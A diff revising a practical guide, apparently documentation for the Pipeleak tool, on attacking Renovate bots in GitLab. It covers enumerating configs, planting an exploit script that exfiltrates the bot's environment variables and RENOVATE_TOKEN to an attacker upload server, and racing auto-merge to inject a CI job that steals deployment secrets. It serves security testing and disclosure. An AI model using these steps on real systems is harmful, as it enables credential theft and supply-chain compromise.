@@ -1,26 +1,28 @@
 
 
+
 # Attacking Renovate Bots: A Practical Guide
 
-This guide shows how to use Pipeleak to discover and exploit common misconfigurations in Renovate bot setups. For background and technical details, see the full blog post: https://blog.compass-security.com/2025/05/renovate-keeping-your-updates-secure/
+This guide explains how to use Pipeleak to discover and exploit common misconfigurations in Renovate bot setups. For more background and technical details, see the full [blog post](https://blog.compass-security.com/2025/05/renovate-keeping-your-updates-secure/).
 
-Two main points are important to understand:
+There are two key points to understand:
 
-1. Code Execution by renovated repositories
-> Every project renovated by the same bot must be considered equally trusted and exposed to the same attack level. If one project is compromised, all others processed by that bot can be affected. Code execution by the renovated repository in the bot context is assumed in Renovates threat model.
+1. **Code Execution by Renovated Repositories**
+> Every project renovated by the same bot must be considered equally trusted and exposed to the same attack level. If one project is compromised, all others processed by that bot can be affected. Code execution by the renovated repository in the bot context is assumed in Renovate's threat model.
 
-2. GitLab invite auto acceptance:
-> GitLab project invites are auto accepted. You can invite any bot directly to your repository. If it is then renovated by the invited bot you can compromise the bot user.
+2. **GitLab Invite Auto-Acceptance**
+> GitLab project invites are auto-accepted. You can invite any bot directly to your repository. If it is then renovated by the invited bot, you can compromise the bot user.
+
 
 ## 1. Enumerate Renovate Bot Usage
 
-Use the `enum` command to scan your GitLab instance for Renovate bot jobs and config files. This is useful for:
+Use the `enum` command to scan your GitLab instance for Renovate bot jobs and configuration files. This is useful for:
 
 - Identify Renovate configurations
 - Finding projects with vulnerable Renovate bot configurations
 - Collecting config files for further analysis
 
-We enumerate  Renovate configs found on GitLab.com. One project has been found, that enables Renovate's autodiscovery of projects and does NOT set any autodiscovery filters.
+For example, we enumerated Renovate configs found on GitLab.com. One project was found that enables Renovate's autodiscovery of projects and does **not** set any autodiscovery filters.
 
 ```bash
 pipeleak gl renovate enum -g https://gitlab.com -t glpat-[redacted] --dump
@@ -30,15 +32,18 @@ pipeleak gl renovate enum -g https://gitlab.com -t glpat-[redacted] --dump
 2025-09-30T07:11:16Z INF Done, Bye Bye 🏳️‍🌈🔥
 ```
 
-This means this bot is vulnerable to the autodiscovery exploit.
+
+This makes the bot susceptible to autodiscovery exploits, since it will renovate any repository it can access.
+
+Even when autodiscovery filters are enabled, weak or poorly written filter regexes can still allow attackers to bypass them and exploit the bot.
 
 ---
 
 ## 2. Exploit Autodiscovery with a Malicious Project
 
-The Renovate bot from the example above is configured to autodiscover new projects and does not apply any or only weak bypassable filters. You can create a repository with a malicious script that gets executed by the bot. 
+The Renovate bot from the example above is configured to autodiscover new projects and does not apply any, or only weak, bypassable filters. You can create a repository with a malicious script that gets executed by the bot.
 
-The following command creates a repository, that includes an exploit script called `exploit.sh`. Whenever a Renovate bot picks up this repo, the script will be executed.
+The following command creates a repository that includes an exploit script called `exploit.sh`. Whenever a Renovate bot picks up this repo, the script will be executed.
 ```bash
 pipeleak gl renovate autodiscovery -g https://gitlab.com -t glpat-[redacted] 
 2025-09-30T07:19:33Z INF Created project name=devfe-pipeleak-renovate-autodiscovery-poc url=https://gitlab.com/myuser/devfe-pipeleak-renovate-autodiscovery-poc
@@ -51,7 +56,7 @@ pipeleak gl renovate autodiscovery -g https://gitlab.com -t glpat-[redacted]
 2025-09-30T07:19:37Z INF Then wait until the created project is renovated by the invited by the Renovate Bot user
 ```
 
-First we need to setup the `exploit.sh` script according to our needs. Our goal is to read the Renovates process environment variables and exfiltrate them to our attacker server.
+First, set up the `exploit.sh` script according to your needs. The goal is to read the Renovate process environment variables and exfiltrate them to your attacker server.
 
 ```bash
 #!/bin/bash
@@ -77,34 +82,35 @@ else
 fi
 ```
 
-On our attacker server we start a [GoShs](https://github.com/patrickhener/goshs) server to accept the environment files from the Renovate process.
+On your attacker server, start a [GoShs](https://github.com/patrickhener/goshs) server to accept the environment files from the Renovate process.
 ```bash
 ./goshs --ssl --self-signed --upload-only -no-clipboard --no-delete --port 8000
 INFO   [2025-09-30 09:31:29] You are running the newest version (v1.1.1) of goshs
 ```
 
-In the next step we have to identify the bot user and invite it to our repository. By looking at at the Renovate bot configuration we can identify the renovated repos, and check the username of the bot user in the merge requests created by that bot. 
 
-Such a MR can look like this. Below the title we see the bots username `renovate_runner`.
+Next, identify the bot user and invite it to your repository. By looking at the Renovate bot configuration, you can identify the renovated repos and check the username of the bot user in the merge requests created by that bot.
+
+Such a merge request can look like this. Below the title, you see the bot's username `renovate_runner`.
 
 ![Renovate MR](./renovate_mr.png)
 
-Now we will invite that user to our repository with `developer` acess. Now its time to wait, until the bot is triggered next.
-After it has run, we can can the environ file on our GoShs server.
+Invite that user to your repository with `developer` access. Now, wait until the bot is triggered next. After it has run, you can find the environment file on your GoShs server.
 
-In that file we want to extract all sensitive environment variables and use the for lateral movement.
-Most intersting is probably the `RENOVATE_TOKEN` as it might contain GitLab PAT. You can then enumerate the access of that PAT using Pipeleaks features.
+In that file, extract all sensitive environment variables and use them for lateral movement. Most interesting is probably the `RENOVATE_TOKEN`, as it might contain a GitLab PAT. You can then enumerate the access of that PAT using Pipeleak's features.
+
+> After receiving a merge request from the Renovate bot, you must fully delete both the branch and the merge request. This ensures the bot will recreate them, allowing your script to run again. Otherwise, the script will not be executed a second time. Ensure to revert the commits as well if they were merged.
 
 
 ## 3. Privilege Escalation via Renovate Bot Branches
 
-In this scenario we assume, that we already gained access to a repositry, but only with developer access. We want to gain access to the configured CI/CD variables, that are configured for deployments. However we cannot directly access these, as they are only provided to pipeline runs on protected branches like the main `branch`.
+In this scenario, assume you already have access to a repository, but only with developer permissions. You want to gain access to the CI/CD variables configured for deployments. However, you cannot directly access these, as they are only provided to pipeline runs on protected branches like the main branch.
 
-Luckily the project is using Renovate and the bot is configured to auto merge after the tests pass in the MR created by the bot. Thus the bot has maintainer access to the repository.
+Fortunately, the project is using Renovate and the bot is configured to auto-merge after tests pass in the merge request created by the bot. Thus, the bot has maintainer access to the repository.
 
-Our goal is to abuse the Renovate bot access level to merge a malicious `gitlab-ci.yml` file into the main branch, effectively bypassing a review by the other project maintainers. On the main branch we can then steal the exposed environment variables used for the deployments.
+Your goal is to abuse the Renovate bot's access level to merge a malicious `gitlab-ci.yml` file into the main branch, effectively bypassing a review by other project maintainers. On the main branch, you can then steal the exposed environment variables used for deployments.
 
-Using Pipeleak we can monitor our repository for new renovate branches. When a new one is detected, Pipeleak tries to add a new job into the `gitlab-ci.yml`. As this needs to exploit a race condition (add new changes to Renovate branch, before the bot activates auto-merge) this might take a few attempts.
+Using Pipeleak, you can monitor your repository for new Renovate branches. When a new one is detected, Pipeleak tries to add a new job into the `gitlab-ci.yml`. As this needs to exploit a race condition (adding new changes to the Renovate branch before the bot activates auto-merge), this might take a few attempts.
 
 ```bash
 pipeleak gl renovate privesc -g https://gitlab.com -t glpat-[redacted] --repoName company1/a-software-project --renovateBranchesRegex 'renovate/.*' -v
@@ -126,4 +132,5 @@ pipeleak gl renovate privesc -g https://gitlab.com -t glpat-[redacted] --repoNam
 2025-09-30T07:57:31Z INF CI/CD configuration updated, check yourself if we won the race! branch=renovate/update-lib1
 2025-09-30T07:57:31Z INF If Renovate automatically merges the branch, you have successfully exploited the privilege escalation vulnerability and injected a job into the CI/CD pipeline that runs on the default branch
 ```
-Manually go check if the MR has been set to auto merge, and see if your changes land in the main branch. If they do you successfuly injected a CI/CD into the protected branch. From there leak all the credentials and move forward.
+
+Manually check if the merge request has been set to auto-merge, and see if your changes land in the main branch. If they do, you have successfully injected a CI/CD job into the protected branch. From there, leak all the credentials and continue your attack path.
